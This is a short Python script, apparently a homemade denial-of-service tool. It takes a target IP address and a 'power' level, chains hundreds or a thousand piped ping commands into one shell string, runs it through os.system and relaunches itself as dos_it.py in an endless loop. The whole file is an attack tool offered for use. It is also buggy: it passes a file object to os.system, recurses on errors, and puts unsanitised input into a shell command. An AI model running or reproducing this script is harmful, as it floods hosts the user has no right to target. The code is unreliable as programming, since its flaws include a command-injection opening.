from termcolor import colored
import os

def ping(cmd):
    try:
        os.system(cmd)
    except:
        ping(cmd)

if __name__ == '__main__':

    try:
        with open('cmd.txt') as cmd:
            ping(cmd)

        os.system('clear')
    except:

        os.system('clear')
        
        power = input(colored('Enter your power [low/mid/high]: ', 'green')).strip().lower()

        ip = input(colored("Enter target's ip address: ", 'red'))

        if power == 'high':
            cmd = f'ping {ip} | '*1000
        elif power == 'mid':
            cmd = f'ping {ip} | '*500
        elif power == 'low':
            cmd = f'ping {ip} | '*100

        os.system('touch cmd.txt')

        with open('cmd.txt', 'w') as ouf:
            ouf.write(cmd)
        cmd = cmd[:-3]

        ping(cmd)

    os.system('python3 dos_it.py')
